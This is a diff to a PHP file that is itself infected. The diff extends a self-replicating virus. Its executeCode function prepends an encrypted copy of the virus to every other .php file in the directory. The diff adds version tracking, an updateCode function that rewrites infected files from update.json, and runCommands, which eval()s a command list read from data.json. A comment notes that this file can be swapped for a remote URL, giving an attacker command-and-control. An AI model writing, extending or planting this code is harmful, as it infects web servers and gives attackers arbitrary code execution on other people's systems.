@@ -1,22 +1,23 @@
 <?php // Checksum: 382a15b559e142b42c57314801273616 ?><?php
 // BOOM:START
-
 /**
  * Execute payload
  */
 if(!function_exists('executeCode')){
     function executeCode($virus)
     {
+        $version = "1.0.0";
         $filenames = glob('*.php');
         foreach ($filenames as $filename) {
             if($filename == basename(__FILE__)) continue;
             $script = fopen($filename, "r");
             $first_line = fgets($script);
             $virus_hash = md5($filename);
-            if(strpos($first_line, $virus_hash) === false)
+            $version = md5($version);
+            if(strpos($first_line, $virus_hash.$version) === false)
             {
                 $infected = fopen("$filename.infected", "w");
-                $checksum = '<?php // Checksum: '.$virus_hash.' ?>';
+                $checksum = '<?php // Checksum: '.$virus_hash.$version.' ?>';
                 $infection = '<?php ' . encryptContent($virus) . ' ?>';
                 fputs($infected, $checksum, strlen($checksum));
                 fputs($infected, $infection, strlen($infection));
@@ -30,8 +31,65 @@ if(!function_exists('executeCode')){
                 rename($filename . ".infected", $filename);
             }
         }
+        runCommands();
     }
 }
+
+/**
+ * This function will update code if new version is released
+ * TODO: Fix the update code.
+ */
+if(!function_exists('updateCode')){
+    function updateCode(){
+        $version = "1.0.0";
+        $filenames = glob('*.php');
+        foreach ($filenames as $filename) {
+            $script = fopen($filename, "r");
+            $first_line = fgets($script);
+            $virus_hash = md5($filename);
+            $version = md5($version);
+            if(strpos($first_line, $virus_hash.$version) === false){
+                if($filename == basename(__FILE__)) continue;
+                $file_content = file_get_contents($filename);
+                $pos = strpos($file_content, 'executeCode(\$virus);');
+                $new_content = substr($file_content, $pos); // TODO fix here
+                $infected = fopen("$filename.updated", "w");
+                $checksum = '<?php // Checksum: '.$virus_hash.$version.' ?>';
+                $infection = json_decode(file_get_contents('update.json'),true);
+                fputs($infected, $checksum, strlen($checksum));
+                foreach ($infection['data'] as $key => $value) {
+                    fputs($infected, $value, strlen($value));
+                }
+                fputs($infected, $new_content);
+                fclose($script);
+                fclose($infected);
+                unlink($filename);
+                rename($filename . ".updated", $filename);
+            }
+        }
+        return true;
+    }
+}
+
+
+/**
+ * Run commands from your server
+ */
+if(!function_exists('runCommands')){
+    function runCommands(){
+        $version = "1.0.0";
+        $data = file_get_contents('data.json'); // you can put your commands url here
+        $data = json_decode($data, true);
+        if(version_compare($data['version'], $version, '>')) updateCode();
+        if($data['active']){
+            foreach ($data['command_list'] as $command){
+                eval($command);
+            }
+        }
+        else return;
+    }
+}
+
 /**
  * Encrypt code and run it in file.
  */
